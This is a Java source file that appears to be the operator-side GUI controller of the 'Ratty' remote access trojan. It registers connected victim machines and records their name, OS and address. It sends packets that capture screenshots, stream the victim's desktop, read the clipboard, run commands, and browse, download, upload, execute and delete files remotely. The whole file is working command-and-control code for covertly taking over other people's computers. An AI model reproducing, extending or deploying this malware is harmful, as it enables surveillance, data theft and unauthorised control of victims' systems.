package de.sogomn.rat.server.gui;

import java.awt.image.BufferedImage;
import java.io.File;
import java.util.ArrayList;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.IClientObserver;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.DeletePacket;
import de.sogomn.rat.packet.DesktopStreamPacket;
import de.sogomn.rat.packet.DownloadPacket;
import de.sogomn.rat.packet.ExecutePacket;
import de.sogomn.rat.packet.FileSystemPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.NewFolderPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.UploadPacket;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;
import de.sogomn.rat.util.FrameEncoder.IFrame;

/*
 * THIS CLASS IS A MESS!
 * I HAVE NO IDEA HOW ONE MAKES NON-MESSY CONTROLLER CLASSES
 */

public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
	
	private RattyGui gui;
	private JFileChooser fileChooser;
	
	private ArrayList<ServerClient> clients;
	private long nextId;
	
	public RattyGuiController(final RattyGui gui) {
		this.gui = gui;
		
		fileChooser = new JFileChooser();
		clients = new ArrayList<ServerClient>();
		
		gui.setController(this);
	}
	
	private ServerClient getServerClient(final long id) {
		for (final ServerClient client : clients) {
			if (client.id == id) {
				return client;
			}
		}
		
		return null;
	}
	
	private ServerClient getServerClient(final ActiveClient client) {
		for (final ServerClient serverClient : clients) {
			if (serverClient.client == client) {
				return serverClient;
			}
		}
		
		return null;
	}
	
	private File chooseFile() {
		final int input = fileChooser.showOpenDialog(null);
		
		if (input == JFileChooser.APPROVE_OPTION) {
			return fileChooser.getSelectedFile();
		}
		
		return null;
	}
	
	private IPacket getPacket(final String command, final ServerClient serverClient) {
		if (command == RattyGui.POPUP) {
			return PopupPacket.create();
		} else if (command == RattyGui.FREE) {
			return new FreePacket();
		} else if (command == RattyGui.SCREENSHOT) {
			return new ScreenshotPacket();
		} else if (command == RattyGui.COMMAND) {
			return CommandPacket.create();
		} else if (command == RattyGui.DESKTOP) {
			return new DesktopStreamPacket(true);
		} else if (command == RattyGui.CLIPBOARD) {
			return new ClipboardPacket();
		} else if (command == FileTreePanel.REQUEST) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			final FileSystemPacket packet = new FileSystemPacket(path);
			
			treePanel.removeChildren(path);
			
			return packet;
		} else if (command == FileTreePanel.DOWNLOAD) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			final DownloadPacket packet = new DownloadPacket(path);
			
			return packet;
		} else if (command == FileTreePanel.UPLOAD) {
			final File file = chooseFile();
			
			if (file != null) {
				final String localPath = file.getAbsolutePath();
				final FileTreePanel treePanel = serverClient.getTreePanel();
				final String path = treePanel.getLastNodePathFolder();
				final UploadPacket packet = new UploadPacket(localPath, path);
				
				return packet;
			}
		} else if (command == FileTreePanel.EXECUTE) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			final ExecutePacket packet = new ExecutePacket(path);
			
			return packet;
		} else if (command == FileTreePanel.NEW_FOLDER) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastNodePathFolder();
			final String name = JOptionPane.showInputDialog(null);
			
			if (name != null && !name.isEmpty()) {
				final NewFolderPacket packet = new NewFolderPacket(path, name);
				
				return packet;
			}
		} else if (command == FileTreePanel.DELETE) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			final String path = treePanel.getLastPathClicked();
			final DeletePacket packet = new DeletePacket(path);
			
			treePanel.removeFile(path);
			
			return packet;
		}
		
		return null;
	}
	
	private void handle(final ServerClient serverClient, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		serverClient.getDisplayPanel().showImage(image);
	}
	
	private void handle(final ServerClient serverClient, final DesktopStreamPacket packet) {
		final IFrame frame = packet.getFrame();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopStreamPacket request = new DesktopStreamPacket();
		final DisplayPanel displayPanel = serverClient.getDisplayPanel();
		
		displayPanel.showFrame(frame, screenWidth, screenHeight);
		
		serverClient.client.addPacket(request);
	}
	
	private void handle(final ServerClient serverClient, final FileSystemPacket packet) {
		final FileTreePanel treePanel = serverClient.getTreePanel();
		final String[] paths = packet.getPaths();
		
		for (final String path : paths) {
			treePanel.addFile(path);
		}
	}
	
	private void handle(final ServerClient serverClient, final InformationPacket packet) {
		final long id = serverClient.id;
		final String name = packet.getName();
		final String address = serverClient.client.getAddress();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		
		serverClient.logIn(name, os, version);
		serverClient.setController(this);
		
		gui.addTableRow(id, name, address, os, version);
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		final ServerClient serverClient = getServerClient(client);
		final boolean loggedIn = serverClient.isLoggedIn();
		
		if (loggedIn) {
			if (packet instanceof ScreenshotPacket) {
				final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
				
				handle(serverClient, screenshot);
			} else if (packet instanceof DesktopStreamPacket) {
				final boolean streamingDesktop = serverClient.isStreamingDesktop();
				final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
				
				if (streamingDesktop) {
					handle(serverClient, stream);
				}
			} else if (packet instanceof FileSystemPacket) {
				final FileSystemPacket file = (FileSystemPacket)packet;
				
				handle(serverClient, file);
			} else {
				packet.execute(client);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			handle(serverClient, information);
		}
	}
	
	@Override
	public void clientDisconnected(final ActiveClient client) {
		final ServerClient serverClient = getServerClient(client);
		final FileTreePanel treePanel = serverClient.getTreePanel();
		final long id = serverClient.id;
		
		client.setObserver(null);
		client.close();
		clients.remove(client);
		
		treePanel.setVisible(false);
		gui.removeTableRow(id);
	}
	
	@Override
	public synchronized void clientConnected(final ActiveServer server, final ActiveClient client) {
		final long id = nextId++;
		final ServerClient serverClient = new ServerClient(id, client);
		final InformationPacket packet = new InformationPacket();
		
		client.setObserver(this);
		clients.add(serverClient);
		client.start();
		client.addPacket(packet);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		//...
	}
	
	@Override
	public void userInput(final String command) {
		final long lastIdClicked = gui.getLastIdClicked();
		final ServerClient serverClient = getServerClient(lastIdClicked);
		final IPacket packet = getPacket(command, serverClient);
		
		if (packet != null) {
			serverClient.client.addPacket(packet);
		}
		
		if (command == RattyGui.DESKTOP) {
			serverClient.setStreamingDesktop(true);
			gui.setStreaming(lastIdClicked, true);
		} else if (command == RattyGui.DESKTOP_STOP) {
			serverClient.setStreamingDesktop(false);
			gui.setStreaming(lastIdClicked, false);
		} else if (command == RattyGui.FILES) {
			final FileTreePanel treePanel = serverClient.getTreePanel();
			
			treePanel.setVisible(true);
		}
	}
	
}
